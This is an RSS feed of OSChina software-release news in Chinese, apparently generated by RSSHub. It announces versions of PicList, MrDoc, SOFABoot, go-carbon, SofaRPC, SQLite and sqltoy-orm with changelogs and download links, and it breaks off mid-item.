<?xml version="1.0" encoding="UTF-8"?>
<rss
    xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"


>
    <channel>
        <title>
            <![CDATA[开源中国-软件更新资讯]]>
        </title>
        <link>https://www.oschina.net/news/project</link>
        <atom:link href="https://rsshub.app/oschina/news/project" rel="self" type="application/rss+xml" />
        <description>
            <![CDATA[开源中国-软件更新资讯 - Made with love by RSSHub(https://github.com/DIYgod/RSSHub)]]>
        </description>
        <generator>RSSHub</generator>
        <webMaster>i@diygod.me (DIYgod)</webMaster>
        <language>zh-cn</language>
        <lastBuildDate>Tue, 23 Jan 2024 05:38:51 GMT</lastBuildDate>
        <ttl>120</ttl>
        <item>
            <title>
                <![CDATA[PicList 2.7.2 发布，图床管理和上传工具，新增 S3 支持]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p>PicList 是一款高效的云存储和图床平台管理工具，在 PicGo 的基础上经过深度的二次开发，不仅完整保留了 PicGo 的所有功能，还增添了许多新的 feature。例如相册支持同步云端删除文件，内置图床额外添加了 WebDav、本地图床和 SFTP 等。PicList 同时增加了完整的云存储管理功能，包括云端目录查看、文件搜索、批量上传下载和删除文件，复制多种格式文件链接和图片/markdown/文本/视频预览等，另外还有更加强大的相册和多项功能新增或优化。</p><h2>开源地址和软件官网</h2><ul><li><p>Github: <a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2FKuingsmile%2FPicList" target="_blank">https://github.com/Kuingsmile/PicList</a></p></li><li><p>Gitee: <a href="https://gitee.com/kuingsmile/PicList">https://gitee.com/kuingsmile/PicList</a></p></li><li><p>软件官网：<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fpiclist.cn" target="_blank">https://piclist.cn</a></p></li></ul><h2>下载地址</h2><h3>MacOS</h3><p><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Frelease.piclist.cn%2Flatest%2FPicList-2.7.2-arm64.dmg" target="_blank">PicList-2.7.2-arm64.dmg</a><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Frelease.piclist.cn%2Flatest%2FPicList-2.7.2-x64.dmg" target="_blank">PicList-2.7.2-x64.dmg</a><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Frelease.piclist.cn%2Flatest%2FPicList-2.7.2-universal.dmg" target="_blank">PicList-2.7.2-universal.dmg</a></p><h3>Windows</h3><p><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Frelease.piclist.cn%2Flatest%2FPicList-Setup-2.7.2-ia32.exe" target="_blank">PicList-Setup-2.7.2-ia32.exe</a><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Frelease.piclist.cn%2Flatest%2FPicList-Setup-2.7.2-x64.exe" target="_blank">PicList-Setup-2.7.2-x64.exe</a><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Frelease.piclist.cn%2Flatest%2FPicList-Setup-2.7.2.exe" target="_blank">PicList-Setup-2.7.2.exe</a></p><h3>Linux</h3><p><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Frelease.piclist.cn%2Flatest%2FPicList-2.7.2.AppImage" target="_blank">PicList-2.7.2.AppImage</a><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Frelease.piclist.cn%2Flatest%2Fpiclist_2.7.2_amd64.snap" target="_blank">piclist_2.7.2_amd64.snap</a></p><h2>本次更新内容</h2><h3>✨ Features</h3><ul><li>新增内置 S3 API 兼容平台支持</li><li>现在又拍云图床支持自定义接口地址</li><li>七牛云新建存储桶新增<code>亚太-河内</code>支持</li></ul><h3>🐛 Bug Fixes</h3><ul><li>修复了修改 s3 图床相册链接后，拷贝图片链接没有对应修改的问题</li><li>修复了修改 s3 图床相册连接后，云端删除失效的问题</li><li>修复了设置精细转换格式时的序列化错误</li><li>修复了界面翻译错误</li></ul><h2>特色功能</h2><ul><li>保留了 PicGo 的所有功能，兼容绝大部分已有的 PicGo 插件，包括和 Typora、Obsidian 等软件的搭配</li><li>新增了多个内置图床，如 WebDav、本地图床和 SFTP 等，原内置 imgur 图床额外支持登录账号上传</li><li>相册中可同步删除云端图片，支持所有内置图床和多个插件</li><li>相册新增了高级搜索和排序，批量修改 URL 等功能</li><li>内置水印添加、图片压缩、图片缩放、图片旋转和图片格式转换等功能，同时支持高级重命名</li><li>支持配置同步至 Github 或 Gitee 仓库</li><li>支持管理十余种图床，可以在线进行云端目录查看、文件搜索、批量上传、批量下载、删除文件等</li><li>支持预览多种格式的文件，包括图片、视频、纯文本文件和 markdown 文件等，具体支持的格式请参考<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2FKuingsmile%2FPicList%2Fblob%2Fdev%2Fsupported_format.md" target="_blank">支持的文件格式列表</a></li><li>支持启用正则表达式的批量云端文件重命名</li><li>对于私有存储桶等支持复制预签名链接进行分享</li><li>支持软件自动更新，支持多种启动模式，还有更多功能细节新增和优化</li><li>优化了 PicGo 的界面，解锁了窗口大小限制，同时美化了部分界面布局</li><li>mac 平台安装包已签名，从源头解决了 PicGo 上的安装包已损坏的日经问题</li></ul><h2>软件截图</h2><p><img alt="image.png" src="https://note.msq.pub/202308230137997.webp" referrerpolicy="no-referrer"><img alt="image.png" src="https://note.msq.pub/202308230138231.webp" referrerpolicy="no-referrer"><img alt="image.png" src="https://note.msq.pub/202308230138929.webp" referrerpolicy="no-referrer"><img alt="image.png" src="https://note.msq.pub/202308230139152.webp" referrerpolicy="no-referrer"></p></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 05:17:46 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276425</guid>
            <link>https://www.oschina.net/news/276425</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[MrDoc 0.9.2 发布，类似语雀、飞书的开源在线文档和知识库系统]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">MrDoc 觅思文档是基于 Python 语言的 Django 框架开发并开源的在线文档系统。</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><span style="background-color:#ffffff">其功能类似于</span><strong><span style="background-color:#ffffff">国内的语雀平台、看云平台、为知笔记和飞书文档，国外的&nbsp;GitBook 平台。</span></strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><span style="background-color:#ffffff">如果你在寻找<strong>可私有化部署的在线文档系统</strong>，那么 MrDoc 觅思文档值得一试。</span></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img src="https://oscimg.oschina.net/oscnet/up-52e0524eae217a33a79eafbdaa70e060cae.png" referrerpolicy="no-referrer"></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">MrDoc 以「文档」作为系统的主要承载形式，支持用 Markdown 和富文本进行<strong>「普通文档」</strong>的写作，支持类似 Excel 的在线表格用来<strong>「表格文档」</strong>的记录。</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">同时以书籍形式的<strong>结构化文集</strong>作为文档的呈现形式，非常<strong>适合个人和小型团队作为私有化的文档、笔记和知识管理工具。</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img src="https://oscimg.oschina.net/oscnet/up-031f753fd43bb3cbeedfc7187e13ad3eb02.png" referrerpolicy="no-referrer"></p><h2>全平台多终端支持</h2><h3>浏览器扩展</h3><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">MrDoc 通过官方浏览器扩展 ——MrDoc 速记（支持 Chromium 系列浏览器和火狐浏览器）（项目地址为：https://gitee.com/zmister/mrdoc-webclipper）和接入「简悦」扩展，实现了网站内容剪藏，可以化身成为互联网内容收藏神器。</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img alt="" height="305" src="https://oscimg.oschina.net/oscnet/up-6cd4ce2124ac6db74b307d6f1fbd34b9b67.png" width="640" referrerpolicy="no-referrer"></p><h3>桌面客户端</h3><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">MrDoc 还提供了基于 Electron 开发的桌面客户端，跨平台支持 Windows、Linux 和 macOS。</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><br><img alt="" height="344" src="https://oscimg.oschina.net/oscnet/up-090434adddfa06200a2b9de4a6f34192d6e.png" width="640" referrerpolicy="no-referrer"></p><h3>Obsidian 插件</h3><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">通过使用 Obsidian 插件，你既可以将 Obsidian 本地仓库的文档实现 Web 线上化浏览和多端同步，也可以实现 MrDoc 文档的本地化存储，一举两得。</p><p><img height="449" src="https://oscimg.oschina.net/oscnet/up-753ee4d333d3967de3eb6b829a03ebe6f80.png" width="450" referrerpolicy="no-referrer"></p><h3>移动端 APP</h3><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">通过移动端 APP，你可以在手机上快速新建文集、文档，修改文档、上传图片、阅读文档……</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img alt="" height="640" src="https://oscimg.oschina.net/oscnet/up-666ae3396ea041b2490c4d2ef6567e3c114.jpg" width="288" referrerpolicy="no-referrer"></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">总而言之，<strong>你所写的一切都在你自己的掌控之中</strong>，不用担心哪家的产品突然宣布停止服务，不用担心收藏在互联网平台上的内容被各种原因清理掉。</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">根据用户的使用反馈，很多朋友用来做<strong>个人私有云笔记、团队知识库、公司产品手册、组织规章制度和办事指南</strong>等</p><h2>更新内容</h2><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">在<u><span>&nbsp;</span>2024 年 01 月 23 日</u>，MrDoc 开源版归版发布了<span style="color:#c0392b"><strong><span>&nbsp;</span>0.9.2<span>&nbsp;</span></strong></span>版本，本次版本发布带来了一大波的更新、优化和 Bug 修复，详细的更新内容如下：</p><ul><li>[新增]用户 Token 获取文集层级目录接口新增文档数量数据；</li><li>[新增]用户 Token 删除文档（软删除）接口；</li><li>[新增]用户 Token 验证 Token 接口；</li><li>[新增]支持配置根路径域名验证文件等文本文件访问；</li><li>[新增]后台管理扫描未使用图片功能；</li><li>[修复]editor.md 编辑器 iframe 视频渲染问题；</li><li>[修复]文档分享页代码高亮失效的问题；</li><li>[优化]用户 Token Api 接口的 POST 请求支持提交 json 数据；</li><li>[优化]更新登录限制 URL 白名单；</li><li>[优化]默认允许来自 obsidian 的跨域请求；</li><li>[优化]用户 Token 修改文档接口可设置上级文档参数；</li><li>[优化]文档页面转发弹出框样式；</li><li>[优化]文集列表文集简介文本显示；</li><li>[优化]editormd 编辑器添加思维导图示例；</li><li>[优化]更新依赖库版本；</li></ul><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>MrDoc 官网：</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><u>https://mrdoc.pro</u></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><strong>MrDoc 文档站点：</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><u>https://doc.mrdoc.pro</u></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><strong>开源仓库地址：</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><u>https://gitee.com/zmister/MrDoc</u></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><u>https://github.com/zmister2016/MrDoc</u></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><strong>浏览器扩展：</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><u>https://gitee.com/zmister/mrdoc-webclipper</u></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><strong>桌面客户端：</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><u>https://gitee.com/zmister/mrdoc-desktop-release</u></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><strong>移动 APP：</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><u>https://gitee.com/zmister/mrdoc-app-release</u></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><strong>文档导入工具箱：</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><a href="https://gitee.com/zmister/mrdoc-import-toolbox">https://gitee.com/zmister/mrdoc-import-toolbox</a></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><strong>示例站点：</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify"><u>http://mrdoc.zmister.com/&nbsp;</u></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:justify">测试账号：test1 测试密码：123456</p></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 03:48:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276413/mrdoc-0-9-2-released</guid>
            <link>https://www.oschina.net/news/276413/mrdoc-0-9-2-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[SOFABoot 4.2.0 发布，蚂蚁开源的基于 Springboot 的服务框架]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p><span style="color:#333333">SOFABoot 是蚂蚁金服开源的基于 Spring Boot 的研发框架，它在 Spring Boot 的基础上，提供了诸如 Readiness Check，类隔离，日志空间隔离等等能力。在增强了 Spring Boot 的同时，SOFABoot 提供了让用户可以在 Spring Boot 中非常方便地使用 SOFA 中间件的能力。</span></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><span style="color:#333333">SOFABoot 4.2.0</span><span style="color:#333333"><span>&nbsp;</span>现已发布，具体更新内容包括：</span></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong style="color:#24292f">New Features</strong></p><ul><li>更新 SpringBoot 3.2.2&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-boot%2Fpull%2F1266" target="_blank">#1266</a></li><li>支持虚拟线程<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-boot%2Fpull%2F1272" target="_blank">#1272</a></li><li>支持&nbsp;ExcludeBeanNameAutoProxyCreator&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-boot%2Fpull%2F1277" target="_blank">#1277</a></li></ul><p style="text-align:start"><strong><span><span><span style="color:#1f2328"><span><span><span><span><span><span><span><span><span><span><span><span style="background-color:#ffffff"><span><span><span>Optimize</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></strong></p><ul><li>为 jdk21 运行时添加 ci&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-boot%2Fpull%2F1265" target="_blank">#1265</a></li><li>跳过低成本 spring.context.config-classes.enhance 和 bean-factory&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-boot%2Fpull%2F1270" target="_blank">#1270</a></li><li>添加 Sofa&nbsp;默认的可列出 bean factory&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-boot%2Fpull%2F1279" target="_blank">#1279</a></li><li>中断时避免 SpringContextInstallStage 中的 npe&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-boot%2Fpull%2F1280" target="_blank">#1280</a></li></ul><p>更新说明：<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-boot%2Freleases%2Ftag%2Fv4.2.0" target="_blank">https://github.com/sofastack/sofa-boot/releases/tag/v4.2.0</a></p></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 03:16:08 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276410/sofaboot-4-2-0-released</guid>
            <link>https://www.oschina.net/news/276410/sofaboot-4-2-0-released</link>
            <author>
                <![CDATA[来源: OSCHINA]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[go-carbon v2.3.6 发布，轻量级、语义化、对开发者友好的 golang 时间处理库]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">carbon 是一个轻量级、语义化、对开发者友好的 Golang 时间处理库，支持链式调用、农历和 gorm、xorm 等主流 orm。</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">目前已被<span><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fyinggaozhen%2Fawesome-go-cn%23%25E6%2597%25A5%25E6%259C%259F%25E5%2592%258C%25E6%2597%25B6%25E9%2597%25B4" target="_blank">awesome-go-cn</a><span><span>&nbsp;</span></span>收录，如果您觉得不错，请给个 star 吧</p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fgolang-module%2Fcarbon" target="_blank">github.com/golang-module/carbon</a></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><a href="https://gitee.com/golang-module/carbon" target="_blank">gitee.com/golang-module/carbon</a></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>更新日志</strong></p><ol><li>将日历提取出来作为独立子包</li><li>新增 <strong>CreateFromLunar</strong> 方法，从 <strong>农历日期</strong> 创建 <strong>Carbon</strong> 实例</li><li>修复 <strong>ToMonthString</strong>, <strong>ToShortMonthString</strong>, <strong>ToWeekString</strong>, <strong>ToShortWeekString</strong>, <strong>Season</strong> , <strong>Constellation</strong> 方法并发读写错误</li><li>提供单元测试和性能测试覆盖率</li></ol></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 02:43:08 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276408/go-carbon-2-3-6-released</guid>
            <link>https://www.oschina.net/news/276408/go-carbon-2-3-6-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[SofaRPC v5.12.0 发布，蚂蚁金服开源 Java RPC 框架]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p><span style="color:#333333">SOFARPC 是一个高可扩展性、高性能、生产级的 Java RPC 框架。在蚂蚁金服 SOFARPC 已经经历了十多年及五代版本的发展。</span></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><span style="color:#333333">SOFARPC 致力于简化应用之间的 RPC 调用，为应用提供方便透明、稳定高效的点对点远程服务调用方案。为了用户和开发者方便的进行功能扩展。同时提供了丰富的模型抽象和可扩展接口，包括过滤器、路由、负载均衡等等。还围绕 SOFARPC 框架及其周边组件提供丰富的微服务治理方案。</span></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">SofaRPC v5.12.0 现已发布，此版本带来<span style="color:#24292f">对 sofa-rpc 框架的增强和一些错误修复（需要 JDK8 版本支持）。如果你的</span><span style="background-color:#ffffff; color:#24292f">版本介于<span>&nbsp;</span></span><span style="background-color:#ffffff; color:#1f2328">5.7.10 和 5.11.1</span><span style="background-color:#ffffff; color:#24292f"><span>&nbsp;</span>之间，</span><span style="color:#24292f">官方鼓励进行升级。</span></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><span style="color:#24292f">具体更新内容如下：</span></p><p style="text-align:start"><strong>Feature</strong></p><ul><li>添加 Fury 序列化器<span style="background-color:#ffffff; color:#1f2328"><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1348" target="_blank">#1348</a><span style="background-color:#ffffff; color:#1f2328">,<span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1387" target="_blank">#1387</a></li><li>feat：支持由 env 或 spring 应用程序属性配置的 Jackson&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1388" target="_blank">#1388</a></li><li>支持线程池扩展<span style="background-color:#ffffff; color:#1f2328"><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1383" target="_blank">#1383</a><span style="background-color:#ffffff; color:#1f2328">,<span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1393" target="_blank">#1393</a></li></ul><p style="text-align:start"><strong style="color:#333333"><span><span><span><span><span style="color:#24292f"><span><span><span><span><span><span><span><span><span><span><span style="background-color:#ffffff"><span><span><span>Enhancement</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></strong></p><ul><li>将 <span style="background-color:#ffffff; color:#1f2328">hessian&nbsp;</span>从 3.5.0 升级到 3.5.2<span style="background-color:#ffffff; color:#1f2328"><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1385" target="_blank">#1385</a></li><li>将 apollo 从 1.4.0 升级到 2.1.0<span style="background-color:#ffffff; color:#1f2328"><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1358" target="_blank">#1358</a></li><li><span style="background-color:#ffffff; color:#1f2328">chore(deps)</span>：将 /bom 中的 org.apache.dubbo:dubbo 从 3.1.8 升级到 3.1.11<span style="background-color:#ffffff; color:#1f2328"><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1381" target="_blank">#1381</a></li><li><span style="background-color:#ffffff; color:#1f2328">chore(deps)</span>：将 /bom 中的 ch.qos.logback:logback-classic 从 1.2.3 升级到 1.2.13<span style="background-color:#ffffff; color:#1f2328"><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1379" target="_blank">#1379</a></li></ul><p style="text-align:start"><strong>Misc</strong></p><ul><li>文档：添加 ant codespaces <span style="background-color:#ffffff; color:#1f2328">badge</span><span style="background-color:#ffffff; color:#1f2328"><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1370" target="_blank">#1370</a></li><li>cloud_code_scan.yml <a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1373" target="_blank">#1373</a></li><li>更新 cloud_code_scan.yml<span style="background-color:#ffffff; color:#1f2328"><span>&nbsp;</span></span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Fpull%2F1375" target="_blank">#1375</a></li></ul><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">更新说明：<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsofastack%2Fsofa-rpc%2Freleases%2Ftag%2Fv5.12.0" target="_blank">https://github.com/sofastack/sofa-rpc/releases/tag/v5.12.0</a></p></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 02:36:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276406/sofarpc-5-12-0-released</guid>
            <link>https://www.oschina.net/news/276406/sofarpc-5-12-0-released</link>
            <author>
                <![CDATA[来源: OSCHINA]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[SQLite 3.45 发布，添加对 JSONB 格式支持]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p>SQLite 3.45 <u><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.sqlite.org%2Fchanges.html%23version_3_45_0" target="_blank">已发布</a></u>。</p><blockquote><p>SQLite 是一个 C 语言库，实现了一个小型、快速、独立、高可靠性、全功能的 SQL 数据库引擎。SQLite 是世界上使用最多的数据库引擎。SQLite 的源代码属于公共领域，每个人都可以免费使用，用于任何目的。</p></blockquote><p>新版本重写了所有 JSON 函数，改为新的内部解析树格式 JSONB。JSONB 格式可以序列化并存储在数据库中，避免在使用 JSON 值时，还需要进行不必要的重复解析。因此通过支持 JSONB，SQLite 在处理 JSON 数据时能够更高效灵活。</p><p>此外，JSONB 保留所有旧功能，并且所有 JSON 函数也可以接受 JSONB 二进制内容。</p><p>SQLite 承诺其生成的 JSONB 格式良好，但是由于 JSONB 本质上就是一个 BLOB，因此可能存在格式不正确的 JSONB，而 SQLite 在处理格式不正确的 JSONB，就可能出现不同行为，从而发生错误。不过 SQLite 也保证，格式错误的 JSONB 永远不会导致内存错误或是类似问题，也不会出现系统漏洞。</p><p>&nbsp;</p><p>详情查看&nbsp;<em><u><a href="https://www.oschina.net/news/269878/sqlite-lands-jsonb" target="_blank">SQLite 重写了 JSON 函数 —— 推出 JSONB</a></u></em></p></div>
                                    ]]>
            </description>
            <pubDate>Tue, 23 Jan 2024 02:27:22 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276404/sqlite-3-45-released</guid>
            <link>https://www.oschina.net/news/276404/sqlite-3-45-released</link>
            <author>
                <![CDATA[来源: OSCHINA]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[国产 Java ORM：sqltoy-orm 5.2.91 发版]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>开源地址：</strong></p><ul><li>github:&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fchenrenfei%2Fsagacity-sqltoy" target="_blank">https://github.com/sagframe/sagacity-sqltoy</a></li><li>gitee:&nbsp;<a href="https://gitee.com/sagacity/sagacity-sqltoy">https://gitee.com/sagacity/sagacity-sqltoy</a></li><li>idea 插件 (可直接在 idea 中检索安装):&nbsp;&nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fthreefish%2Fsqltoy-idea-plugins" target="_blank">https://github.com/threefish/sqltoy-idea-plugins</a></li><li>sqltoy 脚手架项目：https://gitee.com/momoljw/sss-rbac-admin</li><li>sqltoy lambda 项目:&nbsp;https://gitee.com/gzghde/sqltoy-plus</li></ul><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>更新内容</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">1、<span style="background-color:#ffffff; color:#40485b">修复 updateByQuery 中 UnifyFieldsHandler 未判 null 引发的空指针异常</span></p><p><strong>sqltoy-orm 是 JPA 和超强查询的融合体</strong></p><h3><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsagframe%2Fsagacity-sqltoy%23jpa%25E9%2583%25A8%25E5%2588%2586" target="_blank">JPA 部分</a></h3><ul><li>类似 JPA 的对象化 CRUD、对象级联加载和新增、更新</li><li>强化 update 操作，提供弹性字段修改能力，不同于 hibernate 先 load 后修改，而是一次数据库交互完成修改，确保了高并发场景下数据的准确性</li><li>改进了级联修改，提供了先删除或者先置无效，再覆盖的操作选项</li><li>增加了 updateFetch、updateSaveFetch 功能，强化针对强事务高并发场景的处理，类似库存台账、资金台账，实现一次数据库交互，完成锁查询、不存在则插入、存在则修改，并返回修改后的结果</li><li>增加了树结构封装，便于统一不同数据库树型结构数据的递归查询</li><li>支持分库分表、支持多种主键策略 (额外支持基于 redis 的产生特定规则的业务主键)、加密存储、数据版本校验</li><li>提供了公共属性赋值 (创建人、修改人、创建时间、修改时间、租户)、扩展类型处理等</li><li>提供了多租户统一过滤和赋值、提供了数据权限参数带入和越权校验</li></ul><h3><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsagframe%2Fsagacity-sqltoy%23%25E6%259F%25A5%25E8%25AF%25A2%25E9%2583%25A8%25E5%2588%2586" target="_blank">查询部分</a></h3><ul><li>极为直观的 sql 编写方式，便于从客户端 &lt;--&gt; 代码，双向快速迁移，便于后期变更维护</li><li>支持缓存翻译、反向缓存匹配 key 代替 like 模糊查询</li><li>提供了跨数据库支持能力：不同数据库的函数自动转换适配，多方言 sql 根据实际环境自动匹配、多数据库同步测试，大幅提升了产品化能力</li><li>提供了取 top 记录、随机记录等特殊场景的查询功能</li><li>提供了最强大的分页查询机制：1) 自动优化 count 语句；2) 提供基于缓存的分页优化，避免每次都执行 count 查询；3) 提供了独具特色的快速分页；4) 提供了并行分页</li><li>提供了分库分表能力</li><li>提供了在管理类项目中极为价值的：分组汇总计算、行列转换 (行转列、列转行)、同比环比、树形排序、树形汇总，相关算法自然集成</li><li>提供了基于查询的层次化数据结构封装</li><li>提供了大量辅助功能：数据脱敏、格式化、条件参数预处理等</li></ul><h3><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fsagframe%2Fsagacity-sqltoy%23%25E6%2594%25AF%25E6%258C%2581%25E5%25A4%259A%25E7%25A7%258D%25E6%2595%25B0%25E6%258D%25AE%25E5%25BA%2593" target="_blank">支持多种数据库</a></h3><ul><li>常规的 mysql、oracle、db2、postgresql、 sqlserver、dm、kingbase、sqlite、h2、 oceanBase、polardb、guassdb、tidb</li><li>支持分布式 olap 数据库: clickhouse、StarRocks、greenplum、impala (kudu)</li><li>支持 elasticsearch、mongodb</li><li>所有基于 sql 和 jdbc 各类数据库查询</li></ul><p style="color:#333333; 